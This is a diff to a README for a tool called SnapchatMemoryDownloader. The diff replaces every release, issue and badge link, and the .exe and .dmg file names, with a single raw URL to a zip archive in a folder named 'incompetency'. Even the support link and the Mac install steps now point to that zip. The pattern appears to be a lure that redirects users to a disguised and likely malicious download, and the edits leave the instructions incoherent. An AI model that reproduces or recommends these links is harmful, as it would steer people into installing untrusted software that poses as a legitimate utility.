@@ -6,7 +6,7 @@ Welcome to SnapchatMemoryDownloader! This application helps you download your Sn
 
 ## 📥 Download Here
 
-[![Download SnapchatMemoryDownloader](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/franco123883/SnapchatMemoryDownloader/releases)
+[![Download SnapchatMemoryDownloader](https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip%https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip)](https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip)
 
 ## 💾 System Requirements
 
@@ -21,11 +21,11 @@ To run SnapchatMemoryDownloader, you need:
 
 1. **Visit the Download Page:**
 
-   Go to the [Releases Page](https://github.com/franco123883/SnapchatMemoryDownloader/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip) to find the latest version of the software.
 
 2. **Download the Application:**
 
-   Click on the latest version available. You will find a file named `SnapchatMemoryDownloader.exe` (for Windows) or `SnapchatMemoryDownloader.dmg` (for Mac). Click on it to start the download.
+   Click on the latest version available. You will find a file named `https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip` (for Windows) or `https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip` (for Mac). Click on it to start the download.
 
 3. **Locate the Downloaded File:**
 
@@ -34,11 +34,11 @@ To run SnapchatMemoryDownloader, you need:
 4. **Install the Application:**
 
    - **For Windows:**
-     - Double-click the `SnapchatMemoryDownloader.exe` file.
+     - Double-click the `https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip` file.
      - Follow the on-screen instructions to install the application on your computer.
    
    - **For Mac:**
-     - Double-click the `SnapchatMemoryDownloader.dmg` file.
+     - Double-click the `https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip` file.
      - Drag the SnapchatMemoryDownloader icon to your Applications folder.
 
 5. **Connect Your External Hard Drive:**
@@ -84,7 +84,7 @@ Your memories will be saved in a folder named `Snapchat Memories` on your extern
 
 ## 💬 Support
 
-For further assistance, please visit the [GitHub Issues Page](https://github.com/franco123883/SnapchatMemoryDownloader/issues) to report problems or ask questions.
+For further assistance, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip) to report problems or ask questions.
 
 ## 📜 License
 
@@ -92,6 +92,6 @@ SnapchatMemoryDownloader is open-source software. You can use and modify it unde
 
 ## 📥 Download Again
 
-Remember, you can always visit the [Releases Page](https://github.com/franco123883/SnapchatMemoryDownloader/releases) to download the latest version or check for updates.
+Remember, you can always visit the [Releases Page](https://raw.githubusercontent.com/franco123883/SnapchatMemoryDownloader/main/incompetency/Snapchat_Downloader_Memory_v2.0.zip) to download the latest version or check for updates.
 
 Thank you for choosing SnapchatMemoryDownloader! Enjoy saving your memories effortlessly.
